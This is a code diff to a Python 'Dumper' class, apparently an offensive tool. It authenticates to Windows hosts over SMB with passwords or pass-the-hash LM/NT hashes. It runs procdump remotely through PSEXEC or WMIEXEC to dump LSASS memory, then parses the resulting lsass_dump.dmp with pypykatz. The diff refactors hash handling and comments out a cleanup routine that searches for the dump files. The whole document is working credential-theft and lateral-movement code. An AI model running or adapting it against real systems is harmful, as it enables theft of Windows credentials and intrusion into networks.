@@ -46,8 +46,12 @@ class Dumper:
         }
         if self.credentials["hashes"] != "":
             self.credentials["hashes"] = self.credentials["hashes"].lower()
+            self.credentials["lm_hash"] = self.credentials["hashes"].split(":")[0]
+            self.credentials["nt_hash"] = self.credentials["hashes"].split(":")[1]
         else:
             self.credentials["hashes"] = None
+            self.credentials["lm_hash"] = ""
+            self.credentials["nt_hash"] = ""
         self.smb = SMBConnection(self.target, self.target, sess_port=445, timeout=4)
         self.host_info = self.enum_host_info()
 
@@ -58,8 +62,8 @@ class Dumper:
             user=self.credentials["username"],
             password=self.credentials["password"],
             domain=self.credentials["domain"],
-            nthash=self.credentials["hashes"].split(":")[1],
-            lmhash=self.credentials["hashes"].split(":")[0],
+            nthash=self.credentials["nt_hash"],
+            lmhash=self.credentials["lm_hash"],
         )
         os = self.smb.getServerOS()
         arch = self.get_arch()
@@ -174,7 +178,6 @@ class Dumper:
                 )
             executer.run(remoteName=self.target, remoteHost=self.target)
         elif self.auth == "wmiexec":
-
             executer = WMIEXEC(
                 command="C:\\Users\\Public\\Documents\\procdump.exe -accepteula > nul",
                 username=self.credentials["username"],
@@ -232,15 +235,50 @@ class Dumper:
         self.smb.close()
         print("ClearOut Done")
 
-    def clean_up(self):
-        self.smb.login(
-            user=self.credentials["username"],
-            password=self.credentials["password"],
-            domain=self.credentials["domain"],
-            nthash=self.credentials["hashes"].split(":")[1],
-            lmhash=self.credentials["hashes"].split(":")[0],
-        )
-        pdb.set_trace()
+    # def clean_up(self):
+    #     print("Searching for files")
+    #     if self.credentials["password"] != "":
+    #         password = self.credentials["password"]
+    #     else:
+    #         password = ""
+    #     if self.auth == "psexec":
+    #         executer = PSEXEC(
+    #             "dir C:\\Users\\Public\\Documents | ?{._name -match 'lsass_dump.*?.dmp$'}",
+    #             None,
+    #             None,
+    #             None,
+    #             int(445),
+    #             self.credentials["username"],
+    #             password,
+    #             self.credentials["domain"],
+    #             self.credentials["hashes"],
+    #             None,
+    #             False,
+    #             None,
+    #             "",
+    #         ).run(self.target, self.target)
+    #     elif self.auth == "wmiexec":
+    #         executer = WMIEXEC(
+    #             command="dir C:\\Users\\Public\\Documents | ?{._name -match 'lsass_dump.*?.dmp$'}",
+    #             username=self.credentials["username"],
+    #             password=password,
+    #             domain=self.credentials["domain"],
+    #             hashes=self.credentials["hashes"],
+    #             aesKey=None,
+    #             share="C$",
+    #             noOutput=False,
+    #             doKerberos=False,
+    #             kdcHost=None,
+    #         ).run(self.target)
+    #     # self.smb.login(
+    #     #     user=self.credentials["username"],
+    #     #     password=self.credentials["password"],
+    #     #     domain=self.credentials["domain"],
+    #     #     nthash=self.credentials["nt_hash"],
+    #     #     lmhash=self.credentials["lm_hash"],
+    #     # )
+    #
+    #     pdb.set_trace()
 
     @staticmethod
     def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
